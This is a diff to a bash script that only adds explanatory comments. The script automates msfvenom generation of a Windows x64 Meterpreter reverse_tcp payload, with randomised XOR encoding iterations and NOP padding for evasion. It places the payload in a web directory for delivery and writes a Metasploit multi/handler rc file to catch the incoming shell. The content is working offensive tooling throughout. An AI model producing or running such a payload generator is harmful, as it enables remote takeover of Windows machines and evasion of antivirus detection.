@@ -22,17 +22,17 @@ winx64metrev_tcp_staged() {
   }
   setstaticvars
   getsysargs() {
-    if [ ! -z $1 ]; then
+    if [ ! -z $1 ]; then `# setting the listening host IP address variable`
       lhost=$1
     else
       echo "This is where you enter the listener IP address"
     fi
-    if [ ! -z $2 ]; then
+    if [ ! -z $2 ]; then `# setting the listening host Port address variable`
       lport=$2
     else
       echo "This is where you enter the listener port number"
     fi
-    if [ ! -z $3 ]; then
+    if [ ! -z $3 ]; then `# setting the payload name and extension variable`
       p_name=$3
       f_type=`echo $3 | cut -d"." -f2`
     else
@@ -42,20 +42,20 @@ winx64metrev_tcp_staged() {
   }
   getsysargs $1 $2 $3
   setpayvars() {
-    d_payload="-p windows/x64/meterpreter/reverse_tcp"
-    d_lhost="set lhost=$lhost"
-    d_lport="set lport=$lport"
-    d_encode="-e x64/xor -i `echo ${RANDOM}| sed -r "s/([0-9]{2})(.*)/\1/g"`"
-    d_nop="-n ${RANDOM}"
-    d_format="-f $f_type"
-    d_small="--smallest"
-    d_ignore="IgnoreUnknownPayloads=true"
-    d_uuid="PayloadUUIDName=$pname"
-    d_track="PayloadUUIDTracking=true"
-    d_work="WORKSPACE "
+    d_payload="-p windows/x64/meterpreter/reverse_tcp" `# set the payload`
+    d_lhost="set lhost=$lhost" `# set the lhost`
+    d_lport="set lport=$lport" `# set the lport`
+    d_encode="-e x64/xor -i `echo ${RANDOM}| sed -r "s/([0-9]{2})(.*)/\1/g"`"  `# set the encoder and random iterations`
+    d_nop="-n ${RANDOM}" `# set the nop count to random`
+    d_format="-f $f_type" `# set the output format`
+    d_small="--smallest" `# set the --smallest switch`
+    d_ignore="IgnoreUnknownPayloads=true" `# Ignore unknown whitelisted payloads`
+    d_uuid="PayloadUUIDName=$pname" `# set the payload UUID for whitelisting`
+    d_track="PayloadUUIDTracking=true" `# enable the tracking of the payload UUID`
+    d_work="WORKSPACE " `# set the workspace (modify this)`
   }
   setpayvars
-  paygen() {
+  paygen() {  `# create the command from different variable to use with msfvenom`
     paydirt=`echo \
       $d_payload \
       $d_lhost \
@@ -67,24 +67,24 @@ winx64metrev_tcp_staged() {
       $d_ignore \
       $d_uuid \
       $d_track`
-    $msfv $paydirt > $webdir$p_name
+    $msfv $paydirt > $webdir$p_name  `# the contstructed msfvenom command and output directory `
   }
   paygen
   sethandlervars() {
-    d_use="use exploit/multi/handler"
-    d_payload="set payload `echo $d_payload | cut -d ' ' -f2`"
-    d_dishandler="set DisablePayloadHandler true"
-    d_lhost="set lhost 0.0.0.0"
-    d_lport="set lport $lport"
-    d_ignore="set IgnoreUnknownPayloads true"
-    d_uuid="set PayloadUUIDName $p_name"
-    d_track="set PayloadUUIDTracking true"
-    d_work="WORKSPACE "
-    d_exit="set existonsession false"
-    rcfile="$msfs/`echo $p_name`_handler.rc"
+    d_use="use exploit/multi/handler"  `# set the rc file to use a multihandler`
+    d_payload="set payload `echo $d_payload | cut -d ' ' -f2`" `# set the payload to use in the multihandler`
+    d_dishandler="set DisablePayloadHandler true"  `# set the disablepayloadhandler to true`
+    d_lhost="set lhost 0.0.0.0" `# set the listening IP address to any interface for the multihandler`
+    d_lport="set lport $lport" `# set the listening port for the multihandler`
+    d_ignore="set IgnoreUnknownPayloads true" `# set the ignore unknwon payloads to true`
+    d_uuid="set PayloadUUIDName $p_name" `# set the payload UUID for whitelisting`
+    d_track="set PayloadUUIDTracking true" `# set the payload tracking to true`
+    d_work="WORKSPACE " `# set the workspace (modify here)`
+    d_exit="set existonsession false" `# set exitonsession to false for the multihandler`
+    rcfile="$msfs/`echo $p_name`_handler.rc"  `# set the rc filename and storage location `
   }
   sethandlervars
-  rcgen() {
+  rcgen() { `# used to create the rc file from set variables `
     echo $d_use > $rcfile
     echo $d_payload >> $rcfile
     echo $d_lport >> $rcfile
